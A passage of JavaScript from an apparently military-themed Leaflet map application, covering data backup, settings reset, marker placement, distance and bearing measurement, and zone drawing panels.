        var markers = state.markers.map(function(m) { return { name: m.name, type: m.type, lat: m.lat, lng: m.lng, notes: m.notes }; });
        var routes = state.routes.map(function(r) { return { id: r.id, points: r.points, distance: r.distance }; });
        var zones = state.zones.map(function(z) { return { id: z.id, points: z.points }; });
        var data = {
            markers: markers, routes: routes, zones: zones,
            settings: state.appSettings, layers: state.mapLayers, routeConfig: state.routeConfig,
            version: '3.0', exportDate: new Date().toISOString()
        };
        var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a'); a.href = url; a.download = 'sgp_full_backup_' + Date.now() + '.json'; a.click();
        URL.revokeObjectURL(url);
        showToast('💾 FULL BACKUP EXPORTED');
    };

    window.SGP.clearCache = function() {
        var keys = []; for (var k in localStorage) { if (k.startsWith('sgp_cache_')) keys.push(k); }
        keys.forEach(function(k) { localStorage.removeItem(k); });
        showToast('🧹 CACHE CLEARED (' + keys.length + ' entries)');
        if (state.panelOpen === 'settings') openPanel('settings');
    };

    window.SGP.clearAllAppData = function() {
        if (!confirm('⚠️ This will delete ALL markers, routes, zones, and settings. Continue?')) return;
        state.markers.forEach(function(m) { state.map.removeLayer(m.marker); });
        state.routes.forEach(function(r) { if (r.line) state.map.removeLayer(r.line); r.markers.forEach(function(m) { state.map.removeLayer(m); }); });
        state.zones.forEach(function(z) { if (z.polygon) state.map.removeLayer(z.polygon); });
        state.markers = []; state.routes = []; state.zones = [];
        var keys = []; for (var k in localStorage) { if (k.startsWith('sgp_')) keys.push(k); }
        keys.forEach(function(k) { localStorage.removeItem(k); });
        showToast('⚠️ ALL DATA CLEARED — Reloading');
        setTimeout(function() { location.reload(); }, 1500);
    };

    window.SGP.resetSettings = function() {
        if (!confirm('Reset all settings to defaults? Your data (markers, routes, zones) will be kept.')) return;
        localStorage.removeItem('sgp_appSettings');
        state.appSettings = {
            defaultZoom: 12, mapStyle: 'dark', doubleClickZoom: true, scrollWheelZoom: true,
            showZoomControl: true, autoSaveMapView: true,
            uiColor: 'green', uiFontSize: 100, panelOpacity: 95, language: 'en',
            showCrosshair: true, showCompass: true, showInfoBar: true, showCoords: true,
            animationsEnabled: true, bootScreen: true,
            gpsAccuracy: 'high', gpsUpdateInterval: 5, gpsAutoCenter: false, gpsTrackRecord: false,
            gpsShowAccuracyCircle: false, gpsWakelock: false,
            unitDistance: 'metric', unitSpeed: 'kmh', unitCoords: 'dms', unitAltitude: 'm',
            timeFormat: '24h', dateFormat: 'iso',
            dataRefreshInterval: 60, maxVehicles: 200, minZoomForData: 12, overpassEndpoint: 'auto',
            autoLoadData: true, cacheOverpassData: true, aisApiKey: (window.SGP_CONFIG && window.SGP_CONFIG.aisApiKey) || '',
            notifySound: true, notifyVibrate: true, toastDuration: 3,
            notifyGPSLost: true, notifySOSConfirm: true,
            renderQuality: 'high', hardwareAccel: true, reducedMotion: false, offlineMode: false,
            mapMaxZoom: 19,
            defaultMarkerType: 'friendly', defaultRouteWeight: 3, defaultRouteColor: '#00b4ff',
            defaultRouteStyle: 'dashed', autoSaveRoutes: true
        };
        saveAppSettings();
        applyAppSettings();
        showToast('🔄 SETTINGS RESET TO DEFAULTS');
        if (state.panelOpen === 'settings') openPanel('settings');
    };

    // Also define the old clearAll / exportData for backwards compat
    window.SGP.clearAll = window.SGP.clearAllAppData;
    window.SGP.exportData = window.SGP.exportAllData;

    // =========================================
    // MARKER MANAGER PANEL
    // =========================================
    function renderMarkerPanel() {
        const hasMarkers = state.markers.length > 0;
        const isPlacing = state.currentTool === 'marker';
        const types = [
            { id: 'friendly', icon: '🟢', label: 'FRIENDLY' },
            { id: 'hostile', icon: '🔴', label: 'HOSTILE' },
            { id: 'unknown', icon: '🟡', label: 'UNKNOWN' },
            { id: 'neutral', icon: '🔵', label: 'NEUTRAL' },
            { id: 'objective', icon: '⭐', label: 'OBJECTIVE' },
            { id: 'hazard', icon: '⚠️', label: 'HAZARD' },
            { id: 'medevac', icon: '🏥', label: 'MEDEVAC' },
            { id: 'hq', icon: '🏛️', label: 'HQ / COMMAND' }
        ];
        const groups = {};
        state.markers.forEach(m => { if (!groups[m.type]) groups[m.type] = []; groups[m.type].push(m); });
        let markersHTML = '';
        if (hasMarkers) {
            markersHTML = Object.entries(groups).map(([type, markers]) => {
                const cfg = MARKER_TYPES[type];
                return '<div class="panel-section" style="padding:0;"><div style="display:flex;align-items:center;gap:6px;padding:8px 10px;background:rgba(0,255,65,0.03);border-bottom:1px solid var(--border);"><span>' + cfg.icon + '</span><span style="font-family:var(--font-mono);font-size:0.55rem;color:var(--primary);letter-spacing:1px;flex:1;">' + cfg.label + ' (' + markers.length + ')</span></div>' +
                markers.map(m => '<div class="route-saved-item" onclick="window.SGP.focusMarker(\'' + m.id + '\')" style="border-radius:0;"><div style="font-size:0.8rem;flex-shrink:0;">' + cfg.icon + '</div><div style="flex:1;min-width:0;"><div style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-primary);letter-spacing:0.5px;">' + m.name.toUpperCase() + '</div><div style="font-family:var(--font-mono);font-size:0.45rem;color:var(--text-dim);">' + formatDMS(m.lat, 'lat') + ' ' + formatDMS(m.lng, 'lon') + '</div></div><div class="route-saved-actions"><button onclick="event.stopPropagation(); window.SGP.editMarker(\'' + m.id + '\')" title="Edit">✏️</button><button onclick="event.stopPropagation(); window.SGP.deleteMarker(\'' + m.id + '\')" title="Delete">🗑️</button></div></div>').join('') + '</div>';
            }).join('');
        }
        return '<div class="panel-section"><div class="panel-section-title">📍 MARKER PLACEMENT</div><div class="route-draw-status ' + (isPlacing ? 'active' : '') + '"><span class="route-draw-dot ' + (isPlacing ? 'pulse' : '') + '">●</span><span>' + (isPlacing ? 'PLACEMENT ACTIVE — Click map to place' : 'NOT PLACING') + '</span></div><div style="display:flex;gap:6px;margin-top:8px;">' + (!isPlacing ? '<button class="btn btn-primary" style="flex:1;" onclick="window.SGP.startMarkerPlacement()">✏️ START PLACING</button>' : '<button class="btn btn-secondary" style="flex:1;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.stopMarkerPlacement()">✕ STOP PLACING</button>') + '</div></div>' +
        '<div class="panel-section"><div class="panel-section-title">🎯 QUICK MARKER TYPES</div><div class="route-mode-grid">' + types.map(t => '<div class="route-mode-btn" onclick="window.SGP.quickMarkerType(\'' + t.id + '\')" style="cursor:pointer;"><span style="font-size:1rem;">' + t.icon + '</span><span class="route-mode-label">' + t.label + '</span></div>').join('') + '</div></div>' +
        '<div class="panel-section"><div class="panel-section-title">⚡ QUICK PLACE</div><div class="route-quick-grid"><button class="route-quick-btn" onclick="window.SGP.markerAtPosition()"><span>📍</span><span>At My<br>Position</span></button><button class="route-quick-btn" onclick="window.SGP.markerAtCenter()"><span>🎯</span><span>At Map<br>Center</span></button><button class="route-quick-btn" onclick="window.SGP.markerAtCoords()"><span>🔢</span><span>Enter<br>Coords</span></button><button class="route-quick-btn" onclick="window.SGP.markerPerimeter()"><span>🔲</span><span>Perimeter<br>Posts</span></button><button class="route-quick-btn" onclick="window.SGP.randomPatrol()"><span>🎲</span><span>Random<br>Patrol Pts</span></button><button class="route-quick-btn" onclick="window.SGP.compassMarkers()"><span>🧭</span><span>Cardinal<br>Points</span></button></div></div>' +
        '<div class="panel-section"><div class="panel-section-title">📊 STATISTICS</div><div class="route-eta-display"><div class="route-eta-item"><span class="route-eta-label">TOTAL</span><span class="route-eta-value">' + state.markers.length + '</span></div><div class="route-eta-item"><span class="route-eta-label">FRIENDLY</span><span class="route-eta-value" style="color:#00ff41;">' + (groups.friendly || []).length + '</span></div><div class="route-eta-item"><span class="route-eta-label">HOSTILE</span><span class="route-eta-value" style="color:#ff2d2d;">' + (groups.hostile || []).length + '</span></div><div class="route-eta-item"><span class="route-eta-label">UNKNOWN</span><span class="route-eta-value" style="color:#ffaa00;">' + (groups.unknown || []).length + '</span></div></div></div>' +
        '<div class="panel-section"><div class="panel-section-title">📋 ALL MARKERS (' + state.markers.length + ')</div>' + (hasMarkers ? markersHTML : '<div style="text-align:center;padding:20px;"><div style="font-size:1.5rem;margin-bottom:8px;opacity:0.2;">📍</div><p style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);letter-spacing:1px;">NO MARKERS PLACED<br>Click map or use Quick Place tools</p></div>') + '</div>' +
        '<div class="panel-section"><div class="panel-section-title">📥 IMPORT MARKERS</div><div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);margin-bottom:8px;">Paste coordinates (lat,lng,name,type per line)</div><textarea id="marker-import-text" style="width:100%;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.65rem;resize:none;outline:none;" rows="3" placeholder="40.4168, -3.7038, Alpha-1, friendly"></textarea><button class="btn btn-primary" style="width:100%;margin-top:6px;" onclick="window.SGP.importMarkers()">📥 IMPORT</button></div>' +
        '<div class="panel-section"><div class="panel-section-title">📤 ACTIONS</div><div style="display:flex;gap:6px;"><button class="btn btn-secondary" style="flex:1;" onclick="window.SGP.exportMarkers()">📤 EXPORT ALL</button><button class="btn btn-secondary" style="flex:1;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.clearAllMarkers()">🗑️ CLEAR ALL</button></div><button class="btn btn-secondary" style="width:100%;margin-top:6px;" onclick="window.SGP.toggleMarkerLabels()">👁️ TOGGLE LABELS</button></div>';
    }

    // Marker Panel Handlers
    window.SGP.startMarkerPlacement = function() { state.currentTool = 'marker'; document.getElementById('map').style.cursor = 'crosshair'; showToast('📍 CLICK ON MAP TO PLACE MARKER'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.stopMarkerPlacement = function() { state.currentTool = 'pan'; document.getElementById('map').style.cursor = ''; showToast('MARKER PLACEMENT STOPPED'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.quickMarkerType = function(type) { document.getElementById('marker-type').value = type; state.currentTool = 'marker'; document.getElementById('map').style.cursor = 'crosshair'; showToast('📍 PLACING ' + type.toUpperCase() + ' MARKER — Click map'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.markerAtPosition = function() { if (!state.userPosition) { showToast('⚠ GPS not available'); return; } var lat = state.userPosition.lat || state.userPosition[0], lng = state.userPosition.lng || state.userPosition[1]; addMarkerToMap(lat, lng, 'POS-' + (Date.now() % 1000), 'friendly', 'Auto-placed at user position'); showToast('📍 MARKER AT YOUR POSITION'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.markerAtCenter = function() { var c = state.map.getCenter(); addMarkerToMap(c.lat, c.lng, 'CTR-' + (Date.now() % 1000), 'objective', 'Placed at map center'); showToast('🎯 MARKER AT MAP CENTER'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.markerAtCoords = function() { var input = prompt('Enter coordinates (lat, lng):'); if (!input) return; var parts = input.split(/[,\s]+/); if (parts.length >= 2) { var lat = parseFloat(parts[0]), lng = parseFloat(parts[1]); if (!isNaN(lat) && !isNaN(lng)) { addMarkerToMap(lat, lng, 'MKR-' + (Date.now() % 1000), 'neutral', 'Manual coordinate entry'); state.map.flyTo([lat, lng], 14, { duration: 1 }); showToast('📍 MARKER PLACED'); if (state.panelOpen === 'marker') openPanel('marker'); } else { showToast('⚠ Invalid coordinates'); } } };
    window.SGP.markerPerimeter = function() { var c = state.map.getCenter(), d = 0.003; [['POST-NW', c.lat+d, c.lng-d], ['POST-NE', c.lat+d, c.lng+d], ['POST-SE', c.lat-d, c.lng+d], ['POST-SW', c.lat-d, c.lng-d]].forEach(function(p) { addMarkerToMap(p[1], p[2], p[0], 'friendly', 'Perimeter post'); }); showToast('🔲 4 PERIMETER POSTS PLACED'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.randomPatrol = function() { var c = state.map.getCenter(); for (var i = 0; i < 5; i++) { addMarkerToMap(c.lat + (Math.random()-0.5)*0.01, c.lng + (Math.random()-0.5)*0.01, 'PATROL-' + String.fromCharCode(65+i), 'friendly', 'Patrol checkpoint'); } showToast('🎲 5 PATROL POINTS PLACED'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.compassMarkers = function() { var c = state.map.getCenter(), d = 0.005; addMarkerToMap(c.lat+d, c.lng, 'NORTH', 'neutral', 'Cardinal'); addMarkerToMap(c.lat, c.lng+d, 'EAST', 'neutral', 'Cardinal'); addMarkerToMap(c.lat-d, c.lng, 'SOUTH', 'neutral', 'Cardinal'); addMarkerToMap(c.lat, c.lng-d, 'WEST', 'neutral', 'Cardinal'); showToast('🧭 4 CARDINAL MARKERS PLACED'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.editMarker = function(id) { var m = state.markers.find(function(mk) { return mk.id === id; }); if (!m) return; var n = prompt('Marker name:', m.name); if (n !== null) { m.name = n; saveAllMarkers(); showToast('✏️ MARKER UPDATED'); if (state.panelOpen === 'marker') openPanel('marker'); } };
    window.SGP.exportMarkers = function() { var data = state.markers.map(function(m) { return { name: m.name, type: m.type, lat: m.lat, lng: m.lng, notes: m.notes }; }); var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }); var url = URL.createObjectURL(blob); var a = document.createElement('a'); a.href = url; a.download = 'sgp_markers_' + Date.now() + '.json'; a.click(); URL.revokeObjectURL(url); showToast('📤 MARKERS EXPORTED'); };
    window.SGP.clearAllMarkers = function() { state.markers.forEach(function(m) { state.map.removeLayer(m.marker); }); state.markers = []; saveAllMarkers(); showToast('🗑️ ALL MARKERS CLEARED'); if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.importMarkers = function() { var textarea = document.getElementById('marker-import-text'); if (!textarea || !textarea.value.trim()) { showToast('⚠ Paste data first'); return; } var lines = textarea.value.trim().split('\n'), count = 0; lines.forEach(function(line) { var parts = line.trim().split(/[,]+/).map(function(s) { return s.trim(); }); if (parts.length >= 2) { var lat = parseFloat(parts[0]), lng = parseFloat(parts[1]), name = parts[2] || ('IMP-' + count), type = parts[3] || 'neutral'; if (!isNaN(lat) && !isNaN(lng)) { addMarkerToMap(lat, lng, name, type, 'Imported'); count++; } } }); showToast('📥 ' + count + ' MARKERS IMPORTED'); textarea.value = ''; if (state.panelOpen === 'marker') openPanel('marker'); };
    window.SGP.toggleMarkerLabels = function() { document.querySelectorAll('.marker-label').forEach(function(el) { el.style.display = el.style.display === 'none' ? '' : 'none'; }); showToast('👁️ LABELS TOGGLED'); };

    // =========================================
    // MEASUREMENT TOOLS PANEL
    // =========================================
    if (!state.savedMeasurements) state.savedMeasurements = [];

    function renderMeasurePanel() {
        var isMeasuring = state.currentTool === 'measure';
        var hasPoints = state.measurePoints && state.measurePoints.length > 0;
        var statsHTML = '';
        if (hasPoints && state.measurePoints.length >= 2) {
            var dist = calculateRouteDistance(state.measurePoints);
            var pts = state.measurePoints;
            var lat1 = pts[0][0]*Math.PI/180, lat2 = pts[pts.length-1][0]*Math.PI/180, dLon = (pts[pts.length-1][1]-pts[0][1])*Math.PI/180;
            var y = Math.sin(dLon)*Math.cos(lat2), x = Math.cos(lat1)*Math.sin(lat2)-Math.sin(lat1)*Math.cos(lat2)*Math.cos(dLon);
            var bearing = ((Math.atan2(y,x)*180/Math.PI)+360)%360;
            statsHTML = '<div class="route-eta-display"><div class="route-eta-item"><span class="route-eta-label">DISTANCE</span><span class="route-eta-value">' + formatDistance(dist) + '</span></div><div class="route-eta-item"><span class="route-eta-label">BEARING</span><span class="route-eta-value">' + bearing.toFixed(1) + '°</span></div><div class="route-eta-item"><span class="route-eta-label">SEGMENTS</span><span class="route-eta-value">' + (state.measurePoints.length-1) + '</span></div><div class="route-eta-item"><span class="route-eta-label">POINTS</span><span class="route-eta-value">' + state.measurePoints.length + '</span></div></div>';
        }
        var savedHTML = '';
        if (state.savedMeasurements.length > 0) {
            savedHTML = state.savedMeasurements.map(function(m, i) {
                return '<div class="route-saved-item"><div style="font-size:0.8rem;">📏</div><div style="flex:1;"><div style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-primary);">' + m.label + '</div><div style="font-family:var(--font-mono);font-size:0.45rem;color:var(--text-dim);">' + formatDistance(m.distance) + ' · ' + m.points + ' pts</div></div><button onclick="window.SGP.deleteMeasurement(' + i + ')" style="background:none;border:none;font-size:0.8rem;cursor:pointer;">🗑️</button></div>';
            }).join('');
        }
        return '<div class="panel-section"><div class="panel-section-title">📏 MEASUREMENT MODE</div><div class="route-draw-status ' + (isMeasuring ? 'active' : '') + '"><span class="route-draw-dot ' + (isMeasuring ? 'pulse' : '') + '">●</span><span>' + (isMeasuring ? 'MEASURING — Click map to add points' : 'NOT MEASURING') + '</span></div><div style="display:flex;gap:6px;margin-top:8px;">' + (!isMeasuring ? '<button class="btn btn-primary" style="flex:1;" onclick="window.SGP.startMeasuring()">📏 START MEASURING</button>' : '<button class="btn btn-primary" style="flex:1;" onclick="window.SGP.saveMeasurement()">💾 SAVE</button><button class="btn btn-secondary" style="flex:0 0 auto;" onclick="window.SGP.undoMeasurePoint()">↩ UNDO</button><button class="btn btn-secondary" style="flex:0 0 auto;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.stopMeasuring()">✕</button>') + '</div></div>' +
        statsHTML +
        '<div class="panel-section"><div class="panel-section-title">🔧 MEASUREMENT TOOLS</div><div class="route-quick-grid"><button class="route-quick-btn" onclick="window.SGP.measureStraightLine()"><span>📐</span><span>Straight<br>Line</span></button><button class="route-quick-btn" onclick="window.SGP.measureCircleRadius()"><span>⭕</span><span>Circle<br>Radius</span></button><button class="route-quick-btn" onclick="window.SGP.measureBearing()"><span>🧭</span><span>Bearing<br>Azimuth</span></button><button class="route-quick-btn" onclick="window.SGP.measureGrid()"><span>📊</span><span>Grid<br>Reference</span></button><button class="route-quick-btn" onclick="window.SGP.measureCoordDist()"><span>🔢</span><span>Enter<br>2 Coords</span></button><button class="route-quick-btn" onclick="window.SGP.measureArea()"><span>📐</span><span>Area<br>Polygon</span></button></div></div>' +
        '<div class="panel-section"><div class="panel-section-title">🔄 UNIT CONVERSION</div><div style="display:flex;gap:6px;flex-wrap:wrap;"><input type="number" id="measure-convert-input" placeholder="Enter value" style="flex:1;min-width:80px;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:8px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.65rem;outline:none;"><select id="measure-convert-from" style="flex:1;min-width:60px;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:8px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.6rem;"><option value="m">Meters</option><option value="km">Kilometers</option><option value="mi">Miles</option><option value="nm">Nautical Mi</option><option value="ft">Feet</option><option value="yd">Yards</option></select></div><button class="btn btn-primary" style="width:100%;margin-top:6px;" onclick="window.SGP.convertUnits()">🔄 CONVERT</button><div id="measure-convert-result" style="font-family:var(--font-mono);font-size:0.55rem;color:var(--primary);margin-top:6px;text-align:center;min-height:16px;"></div></div>' +
        '<div class="panel-section"><div class="panel-section-title">💾 SAVED (' + state.savedMeasurements.length + ')</div>' + (state.savedMeasurements.length > 0 ? '<div class="route-saved-list">' + savedHTML + '</div><button class="btn btn-secondary" style="width:100%;margin-top:8px;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.clearMeasurements()">🗑️ CLEAR ALL</button>' : '<div style="text-align:center;padding:16px;"><div style="font-size:1.5rem;margin-bottom:8px;opacity:0.2;">📏</div><p style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);letter-spacing:1px;">NO SAVED MEASUREMENTS</p></div>') + '</div>' +
        '<div class="panel-section"><div class="panel-section-title">📖 QUICK REFERENCE</div><div style="display:flex;flex-direction:column;gap:3px;"><div style="display:flex;justify-content:space-between;padding:4px 8px;font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);background:var(--bg-tertiary);border-radius:4px;"><span>Walking Speed</span><span style="color:var(--primary);">5 km/h</span></div><div style="display:flex;justify-content:space-between;padding:4px 8px;font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);background:var(--bg-tertiary);border-radius:4px;"><span>Rifle Range (5.56)</span><span style="color:var(--primary);">550 m</span></div><div style="display:flex;justify-content:space-between;padding:4px 8px;font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);background:var(--bg-tertiary);border-radius:4px;"><span>Radio Range (VHF)</span><span style="color:var(--primary);">10-30 km</span></div><div style="display:flex;justify-content:space-between;padding:4px 8px;font-family:var(--font-mono);font-size:0.5rem;color:var(--text-dim);background:var(--bg-tertiary);border-radius:4px;"><span>1 Nautical Mile</span><span style="color:var(--primary);">1,852 m</span></div></div></div>';
    }

    // Measurement Handlers
    window.SGP.startMeasuring = function() { state.currentTool = 'measure'; state.measurePoints = []; state.measureMarkers = []; state.measureLine = null; document.getElementById('map').style.cursor = 'crosshair'; showToast('📏 CLICK ON MAP TO MEASURE'); if (state.panelOpen === 'measure') openPanel('measure'); };
    window.SGP.stopMeasuring = function() { finishMeasure(); state.currentTool = 'pan'; document.getElementById('map').style.cursor = ''; showToast('MEASUREMENT STOPPED'); if (state.panelOpen === 'measure') openPanel('measure'); };
    window.SGP.undoMeasurePoint = function() { if (!state.measurePoints || state.measurePoints.length === 0) return; state.measurePoints.pop(); var last = state.measureMarkers.pop(); if (last) state.map.removeLayer(last); if (state.measureLine) state.map.removeLayer(state.measureLine); if (state.measurePoints.length >= 2) { state.measureLine = L.polyline(state.measurePoints, { color: '#ffaa00', weight: 2, dashArray: '5 5', opacity: 0.7 }).addTo(state.map); } else { state.measureLine = null; } if (state.panelOpen === 'measure') openPanel('measure'); };
    window.SGP.saveMeasurement = function() { if (!state.measurePoints || state.measurePoints.length < 2) { showToast('⚠ Need at least 2 points'); return; } var dist = calculateRouteDistance(state.measurePoints); state.savedMeasurements.push({ label: 'MEAS-' + (state.savedMeasurements.length + 1), distance: dist, points: state.measurePoints.length, date: new Date().toISOString() }); showToast('💾 SAVED: ' + formatDistance(dist)); window.SGP.stopMeasuring(); };
    window.SGP.deleteMeasurement = function(idx) { state.savedMeasurements.splice(idx, 1); showToast('🗑️ DELETED'); if (state.panelOpen === 'measure') openPanel('measure'); };
    window.SGP.clearMeasurements = function() { state.savedMeasurements = []; showToast('🗑️ ALL CLEARED'); if (state.panelOpen === 'measure') openPanel('measure'); };
    window.SGP.measureStraightLine = function() { window.SGP.startMeasuring(); showToast('📐 STRAIGHT LINE — Click 2 points'); };
    window.SGP.measureCircleRadius = function() { var r = prompt('Enter radius in meters:'); if (!r || isNaN(parseFloat(r))) return; var radius = parseFloat(r); var c = state.map.getCenter(); L.circle([c.lat, c.lng], { radius: radius, color: '#ffaa00', weight: 2, dashArray: '5 5', fillColor: '#ffaa00', fillOpacity: 0.05 }).addTo(state.map); showToast('⭕ RADIUS: ' + formatDistance(radius)); };
    window.SGP.measureBearing = function() { window.SGP.startMeasuring(); showToast('🧭 BEARING — Click 2 points for azimuth'); };
    window.SGP.measureGrid = function() { var c = state.map.getCenter(); showToast('📊 GRID: ' + formatDMS(c.lat, 'lat') + ' ' + formatDMS(c.lng, 'lon')); };
    window.SGP.measureCoordDist = function() { var input = prompt('Enter 2 coords (lat1,lng1,lat2,lng2):'); if (!input) return; var p = input.split(/[,\s]+/).map(Number); if (p.length >= 4 && p.every(function(v) { return !isNaN(v); })) { var d = state.map.distance(L.latLng(p[0], p[1]), L.latLng(p[2], p[3])); showToast('📏 DISTANCE: ' + formatDistance(d)); } else { showToast('⚠ Invalid format'); } };
    window.SGP.measureArea = function() { window.SGP.startMeasuring(); showToast('📐 AREA — Click 3+ points, then Save'); };
    window.SGP.convertUnits = function() { var val = parseFloat(document.getElementById('measure-convert-input').value); var from = document.getElementById('measure-convert-from').value; var result = document.getElementById('measure-convert-result'); if (isNaN(val)) { result.textContent = '⚠ Enter a value'; return; } var toM = { m: 1, km: 1000, mi: 1609.344, nm: 1852, ft: 0.3048, yd: 0.9144 }; var meters = val * toM[from]; result.innerHTML = '<span style="color:var(--text-dim);">' + val + ' ' + from + '</span> = <span style="color:#00ff41;">' + meters.toFixed(1) + ' m</span> · <span style="color:#00b4ff;">' + (meters/1000).toFixed(3) + ' km</span> · <span style="color:#ffaa00;">' + (meters/1609.344).toFixed(3) + ' mi</span> · <span style="color:#ff44ff;">' + (meters/1852).toFixed(3) + ' nm</span>'; };

    // =========================================
    // ZONE PLANNER PANEL
    // =========================================
    if (!state.zoneColor) state.zoneColor = '#ff2d2d';
    if (!state.zoneFillOpacity) state.zoneFillOpacity = 10;

    function renderZonePanel() {
        var isDrawing = state.currentTool === 'zone';
        var hasZones = state.zones.length > 0;
        var hasPoints = state.zonePoints && state.zonePoints.length > 0;
        var zoneTypes = [
            { id: 'danger', icon: '⚠️', label: 'DANGER ZONE', color: '#ff2d2d' },
            { id: 'restricted', icon: '🚫', label: 'RESTRICTED', color: '#ff6600' },
            { id: 'safe', icon: '✅', label: 'SAFE ZONE', color: '#00ff41' },
            { id: 'objective', icon: '🎯', label: 'OBJECTIVE', color: '#ffdd44' },
            { id: 'recon', icon: '🔭', label: 'RECON AREA', color: '#00b4ff' },
            { id: 'landing', icon: '🚁', label: 'LANDING ZONE', color: '#ff44ff' },
            { id: 'assembly', icon: '🏕️', label: 'ASSEMBLY PT', color: '#8a2be2' },
            { id: 'patrol', icon: '🔄', label: 'PATROL AREA', color: '#00ffcc' }
        ];
        var zonesHTML = '';
        if (hasZones) {
            zonesHTML = state.zones.map(function(z, i) {
                return '<div class="route-saved-item" onclick="window.SGP.focusZone(' + i + ')"><div style="font-size:0.8rem;">🔲</div><div style="flex:1;"><div style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-primary);letter-spacing:0.5px;">ZONE ' + String.fromCharCode(65 + i) + ' · ' + z.points.length + ' vertices</div><div style="font-family:var(--font-mono);font-size:0.45rem;color:var(--text-dim);">' + z.id.replace('zone-','') + '</div></div><div class="route-saved-actions"><button onclick="event.stopPropagation(); window.SGP.exportZone(' + i + ')" title="Export">📤</button><button onclick="event.stopPropagation(); window.SGP.deleteZone(' + i + ')" title="Delete">🗑️</button></div></div>';
            }).join('');
        }
        return '<div class="panel-section"><div class="panel-section-title">🔲 ZONE DRAWING MODE</div><div class="route-draw-status ' + (isDrawing ? 'active' : '') + '"><span class="route-draw-dot ' + (isDrawing ? 'pulse' : '') + '">●</span><span>' + (isDrawing ? 'DRAWING — Click map to add vertices' : 'NOT DRAWING') + '</span></div><div style="display:flex;gap:6px;margin-top:8px;">' + (!isDrawing ? '<button class="btn btn-primary" style="flex:1;" onclick="window.SGP.startZoneDrawing()">✏️ START DRAWING</button>' : '<button class="btn btn-primary" style="flex:1;" onclick="window.SGP.finishZoneDrawing()">✅ CLOSE ZONE</button><button class="btn btn-secondary" style="flex:0 0 auto;" onclick="window.SGP.undoZonePoint()">↩ UNDO</button><button class="btn btn-secondary" style="flex:0 0 auto;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.cancelZone()">✕</button>') + '</div>' + (hasPoints ? '<div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--primary);margin-top:6px;text-align:center;">' + state.zonePoints.length + ' VERTICES PLACED</div>' : '') + '</div>' +
        '<div class="panel-section"><div class="panel-section-title">🏷️ ZONE CLASSIFICATION</div><div class="route-mode-grid">' + zoneTypes.map(function(z) { return '<div class="route-mode-btn" onclick="window.SGP.setZoneType(\'' + z.id + '\',\'' + z.color + '\')" style="cursor:pointer;"><span style="font-size:1rem;">' + z.icon + '</span><span class="route-mode-label">' + z.label + '</span><span style="width:10px;height:10px;border-radius:50%;background:' + z.color + ';flex-shrink:0;"></span></div>'; }).join('') + '</div></div>' +
        '<div class="panel-section"><div class="panel-section-title">🎨 ZONE STYLE</div><div class="route-color-row">' + ['#ff2d2d','#ff6600','#ffdd44','#00ff41','#00b4ff','#ff44ff','#8a2be2','#ffffff'].map(function(c) { return '<div class="route-color-swatch ' + ((state.zoneColor||'#ff2d2d')===c?'active':'') + '" style="background:' + c + ';" onclick="window.SGP.setZoneColor(\'' + c + '\')"></div>'; }).join('') + '</div><div class="route-width-control"><span class="route-width-label">FILL OPACITY</span><input type="range" min="0" max="40" value="' + (state.zoneFillOpacity||10) + '" oninput="window.SGP.setZoneFillOpacity(parseInt(this.value))" style="flex:1;accent-color:' + (state.zoneColor||'#ff2d2d') + ';"><span class="route-width-value">' + (state.zoneFillOpacity||10) + '%</span></div></div>' +
        '<div class="panel-section"><div class="panel-section-title">⚡ PRESET ZONES</div><div class="route-quick-grid"><button class="route-quick-btn" onclick="window.SGP.createCircleZone()"><span>⭕</span><span>Circle<br>Zone</span></button><button class="route-quick-btn" onclick="window.SGP.createSquareZone()"><span>⬜</span><span>Square<br>Zone</span></button><button class="route-quick-btn" onclick="window.SGP.createTriangleZone()"><span>🔺</span><span>Triangle<br>Zone</span></button><button class="route-quick-btn" onclick="window.SGP.createHexZone()"><span>⬡</span><span>Hexagon<br>Zone</span></button><button class="route-quick-btn" onclick="window.SGP.createStarZone()"><span>⭐</span><span>Star<br>Pattern</span></button><button class="route-quick-btn" onclick="window.SGP.createBufferZone()"><span>🔘</span><span>Buffer<br>Zone</span></button></div></div>' +
